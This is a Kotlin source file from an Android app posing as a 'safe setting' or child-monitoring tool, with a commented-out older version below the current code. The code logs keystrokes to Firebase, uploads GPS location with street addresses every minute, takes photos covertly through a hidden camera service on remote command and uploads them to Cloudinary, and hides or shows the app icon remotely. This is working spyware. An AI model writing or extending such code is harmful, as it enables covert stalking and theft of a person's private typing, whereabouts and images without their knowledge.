package com.safe.setting.app.services.accessibilityData

import android.content.Context
import android.location.Geocoder
import android.location.Location
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.safe.setting.app.R
import com.safe.setting.app.data.model.ChildPhoto
import com.safe.setting.app.data.model.Photo
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.utils.CloudinaryManager // 1. CloudinaryManager को इम्पोर्ट करें
import com.safe.setting.app.utils.ConstFun.showApp
import com.safe.setting.app.utils.Consts.CHILD_CAPTURE_PHOTO
import com.safe.setting.app.utils.Consts.CHILD_GPS
import com.safe.setting.app.utils.Consts.CHILD_PERMISSION
import com.safe.setting.app.utils.Consts.CHILD_SERVICE_DATA
import com.safe.setting.app.utils.Consts.CHILD_SHOW_APP
import com.safe.setting.app.utils.Consts.DATA
import com.safe.setting.app.utils.Consts.KEY_LOGGER
import com.safe.setting.app.utils.Consts.KEY_TEXT
import com.safe.setting.app.utils.Consts.LOCATION
import com.safe.setting.app.utils.Consts.PARAMS
import com.safe.setting.app.utils.Consts.PHOTO
import com.safe.setting.app.utils.Consts.TAG
import com.safe.setting.app.utils.MyCountDownTimer
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraConfig
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import javax.inject.Inject


class InteractorAccessibilityData @Inject constructor(
    private val context: Context,
    private val firebase: InterfaceFirebase
) : InterfaceAccessibility, CameraCallbacks {

    private var startTime = (1 * 60 * 1440000).toLong()
    private var interval = (1 * 1000).toLong()
    private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()
    private var lastLocationUpdate: Long = 0
    private val locationUpdateInterval: Long = 60000 // 60 seconds

    private var countDownTimer : MyCountDownTimer = MyCountDownTimer(startTime,interval){
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).removeValue()
        startCountDownTimer()
    }

    // --- बाकी सभी फंक्शन्स (startCountDownTimer, setDataKey, setDataLocation, आदि) वैसे ही रहेंगे ---
    // ...

    override fun startCountDownTimer() {
        countDownTimer.start()
    }

    override fun stopCountDownTimer() {
        countDownTimer.cancel()
    }


    override fun clearDisposable() {
        //disposable.dispose()
        //disposable.clear()
    }

    override fun setDataKey(data: String) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
    }

    override fun setDataLocation(location: Location) {
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastLocationUpdate >= locationUpdateInterval) {
            lastLocationUpdate = currentTime
            if (firebase.getUser() != null) {
                var address: String
                val geoCoder = Geocoder(context, Locale.getDefault())
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    geoCoder.getFromLocation(location.latitude, location.longitude, 1,
                        (Geocoder.GeocodeListener { addresses ->
                            if (addresses.isNotEmpty()) {
                                address = addresses[0].getAddressLine(0)
                                val model = com.safe.setting.app.data.model.Location(location.latitude, location.longitude, address, getDateTime())
                                firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
                            } else {
                                address = context.getString(R.string.address_not_found)
                            }
                        })
                    )
                } else {
                    address = try {
                        @Suppress("DEPRECATION")
                        geoCoder.getFromLocation(location.latitude, location.longitude, 1)?.get(0)!!.getAddressLine(0)
                    } catch (e: IOException) {
                        context.getString(R.string.address_not_found)
                    }
                    val model = com.safe.setting.app.data.model.Location(location.latitude, location.longitude, address, getDateTime())
                    firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
                }
            }
        }
    }

    override fun enablePermissionLocation(location: Boolean) {
        if (firebase.getUser() != null) {
            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION").setValue(location)
        }
    }

    override fun enableGps(gps: Boolean) {
        if (firebase.getUser() != null) {
            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS").setValue(gps)
        }
    }

    override fun setRunServiceData(run: Boolean) {
        if (firebase.getUser() != null) {
            firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
        }
    }

    override fun getShowOrHideApp() {
        disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP")
            .map { data -> data.value as Boolean }
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ context.showApp(it) },
                { e(TAG, it.message.toString()) }))
    }

    override fun getCapturePicture() {
        disposable.add(firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ child -> startCameraPicture(child) },
                { error -> e(TAG, error.message.toString()) }))
    }

    private fun startCameraPicture(childPhoto: ChildPhoto) {
        if (childPhoto.capturePhoto == true) {
            val cameraConfig = CameraConfig().builder(context)
                .setCameraFacing(childPhoto.facingPhoto!!)
                .setImageRotation(
                    if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA) CameraRotation.ROTATION_270
                    else CameraRotation.ROTATION_90
                )
                .build()
            pictureCapture.startCamera(cameraConfig)
        }
    }

    // 2. onImageCapture फंक्शन को बदलें
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onImageCapture(imageFile: File) {
        pictureCapture.stopCamera()

        // नया Cloudinary अपलोड लॉजिक
        disposable.add(CloudinaryManager.uploadPhoto(imageFile)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ url ->
                // Cloudinary से मिला URL और समय Firebase Realtime Database में सहेजें
                val photo = Photo(getRandomNumeric(), getDateTime(), url)
                firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
                firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
                firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
                imageFile.delete() // अपलोड के बाद फाइल को डिलीट कर दें
            }, {
                // कोई त्रुटि होने पर भी फाइल को डिलीट कर दें
                e(TAG, it.message.toString())
                imageFile.delete()
            })
        )
    }

    override fun onCameraError(errorCode: Int) {
        pictureCapture.stopCamera()
        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)

        if (errorCode == ERROR_CAMERA_PERMISSION_NOT_AVAILABLE ||
            errorCode == ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
            errorCode == ERROR_IMAGE_WRITE_FAILED) {
            firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(false)
        }
    }

    // 3. sendFilePhoto और setPushNamePhoto फंक्शन्स को हटा दें
    // private fun sendFilePhoto(...) { ... }  // <-- इस पूरे फंक्शन को डिलीट कर दें
    // private fun setPushNamePhoto(...) { ... } // <-- इस पूरे फंक्शन को डिलीट कर दें


    private fun getDateTime(): String {
        return SimpleDateFormat("yyyy-MM-dd hh:mm:aa", Locale.getDefault()).format(Date())
    }

    private fun getRandomNumeric(): String {
        return (100000..999999).random().toString()
    }

    private fun e(@Suppress("SameParameterValue") tag: String, message: String) {
        Log.e(tag, message)
    }

}
















//package com.safe.setting.app.services.accessibilityData
//
//import android.content.Context
//import android.location.Geocoder
//import android.location.Location
//import android.net.Uri
//import android.os.Build
//import android.util.Log
//import com.safe.setting.app.R
//import com.safe.setting.app.data.model.ChildPhoto
//import com.safe.setting.app.data.model.Photo
//import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
//import com.safe.setting.app.utils.ConstFun.showApp
//import com.safe.setting.app.utils.Consts.CHILD_CAPTURE_PHOTO
//import com.safe.setting.app.utils.Consts.CHILD_GPS
//import com.safe.setting.app.utils.Consts.CHILD_PERMISSION
//import com.safe.setting.app.utils.Consts.CHILD_SERVICE_DATA
//import com.safe.setting.app.utils.Consts.CHILD_SHOW_APP
//import com.safe.setting.app.utils.Consts.DATA
//import com.safe.setting.app.utils.Consts.KEY_LOGGER
//import com.safe.setting.app.utils.Consts.KEY_TEXT
//import com.safe.setting.app.utils.Consts.LOCATION
//import com.safe.setting.app.utils.Consts.PARAMS
//import com.safe.setting.app.utils.Consts.PHOTO
//import com.safe.setting.app.utils.Consts.TAG
//import com.safe.setting.app.utils.FileHelper
//import com.safe.setting.app.utils.MyCountDownTimer
//import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraCallbacks
//import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraConfig
//import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
//import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
//import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
//import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraService
//import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
//import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
//import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
//import io.reactivex.rxjava3.disposables.CompositeDisposable
//import io.reactivex.rxjava3.schedulers.Schedulers
//import java.io.File
//import java.io.IOException
//import java.text.SimpleDateFormat
//import java.util.*
//import javax.inject.Inject
//
//
//class InteractorAccessibilityData @Inject constructor(
//    private val context: Context,
//    private val firebase: InterfaceFirebase
//) : InterfaceAccessibility, CameraCallbacks {
//
//    private var startTime = (1 * 60 * 1440000).toLong()
//    private var interval = (1 * 1000).toLong()
//    private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
//    private var disposable: CompositeDisposable = CompositeDisposable()
//    private var lastLocationUpdate: Long = 0
//    private val locationUpdateInterval: Long = 60000 // 60 seconds
//
//    private var countDownTimer : MyCountDownTimer = MyCountDownTimer(startTime,interval){
//        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).removeValue()
//        startCountDownTimer()
//    }
//
//    override fun startCountDownTimer() {
//        countDownTimer.start()
//    }
//
//    override fun stopCountDownTimer() {
//        countDownTimer.cancel()
//    }
//
//
//    override fun clearDisposable() {
//        //disposable.dispose()
//        //disposable.clear()
//    }
//
//    override fun setDataKey(data: String) {
//        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
//    }
//
//    override fun setDataLocation(location: Location) {
//        val currentTime = System.currentTimeMillis()
//        if (currentTime - lastLocationUpdate >= locationUpdateInterval) {
//            lastLocationUpdate = currentTime
//            if (firebase.getUser() != null) {
//                var address: String
//                val geoCoder = Geocoder(context, Locale.getDefault())
//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
//                    geoCoder.getFromLocation(location.latitude, location.longitude, 1,
//                         (Geocoder.GeocodeListener { addresses ->
//                            if (addresses.isNotEmpty()) {
//                                address = addresses[0].getAddressLine(0)
//                                val model = com.safe.setting.app.data.model.Location(location.latitude, location.longitude, address, getDateTime())
//                                firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
//                            } else {
//                                address = context.getString(R.string.address_not_found)
//                            }
//                        })
//                    )
//                } else {
//                    address = try {
//                        @Suppress("DEPRECATION")
//                        geoCoder.getFromLocation(location.latitude, location.longitude, 1)?.get(0)!!.getAddressLine(0)
//                    } catch (e: IOException) {
//                        context.getString(R.string.address_not_found)
//                    }
//                    val model = com.safe.setting.app.data.model.Location(location.latitude, location.longitude, address, getDateTime())
//                    firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
//                }
//            }
//        }
//    }
//
//    override fun enablePermissionLocation(location: Boolean) {
//        if (firebase.getUser() != null) {
//            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION").setValue(location)
//        }
//    }
//
//    override fun enableGps(gps: Boolean) {
//        if (firebase.getUser() != null) {
//            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS").setValue(gps)
//        }
//    }
//
//    override fun setRunServiceData(run: Boolean) {
//        if (firebase.getUser() != null) {
//            firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
//        }
//    }
//
//    override fun getShowOrHideApp() {
//        disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP")
//            .map { data -> data.value as Boolean }
//            .subscribeOn(Schedulers.io())
//            .observeOn(AndroidSchedulers.mainThread())
//            .subscribe({ context.showApp(it) },
//                { e(TAG, it.message.toString()) }))
//    }
//
//    override fun getCapturePicture() {
//        disposable.add(firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
//            .subscribeOn(Schedulers.io())
//            .observeOn(AndroidSchedulers.mainThread())
//            .subscribe({ child -> startCameraPicture(child) },
//                { error -> e(TAG, error.message.toString()) }))
//    }
//
//    private fun startCameraPicture(childPhoto: ChildPhoto) {
//        if (childPhoto.capturePhoto == true) {
//            val cameraConfig = CameraConfig().builder(context)
//                .setCameraFacing(childPhoto.facingPhoto!!)
//                .setImageRotation(
//                    if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA) CameraRotation.ROTATION_270
//                    else CameraRotation.ROTATION_90
//                )
//                .build()
//            pictureCapture.startCamera(cameraConfig)
//        }
//    }
//
//    override fun onImageCapture(imageFile: File) {
//        pictureCapture.stopCamera()
//        sendFilePhoto(imageFile.absolutePath)
//    }
//
//    override fun onCameraError(errorCode: Int) {
//        pictureCapture.stopCamera()
//        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
//
//        if (errorCode == ERROR_CAMERA_PERMISSION_NOT_AVAILABLE ||
//            errorCode == ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
//            errorCode == ERROR_IMAGE_WRITE_FAILED) {
//            firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(false)
//        }
//    }
//
//    private fun sendFilePhoto(imageFile: String?) {
//        imageFile?.let {
//            val namePhoto = getRandomNumeric()
//            val uri = Uri.fromFile(File(imageFile))
//            disposable.add(firebase.putFile("$PHOTO/$namePhoto", uri)
//                .subscribeOn(Schedulers.io())
//                .observeOn(AndroidSchedulers.mainThread())
//                .subscribe({ task ->
//                    task.storage.downloadUrl.addOnCompleteListener {
//                        setPushNamePhoto(it.result.toString(), namePhoto)
//                        FileHelper.deleteFile(imageFile)
//                    }
//                }, { error ->
//                    e(TAG, error.message.toString())
//                    FileHelper.deleteFile(imageFile)
//                }))
//        }
//    }
//
//    private fun setPushNamePhoto(url: String, namePhoto: String) {
//        val photo = Photo(namePhoto, getDateTime(), url)
//        firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
//        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
//        firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
//    }
//
//    private fun getDateTime(): String {
//        return SimpleDateFormat("yyyy-MM-dd hh:mm:aa", Locale.getDefault()).format(Date())
//    }
//
//    private fun getRandomNumeric(): String {
//        return (100000..999999).random().toString()
//    }
//
//    private fun e(@Suppress("SameParameterValue") tag: String, message: String) {
//        Log.e(tag, message)
//    }
//
//    private fun i(tag: String, message: String) {
//        Log.i(tag, message)
//    }
//}
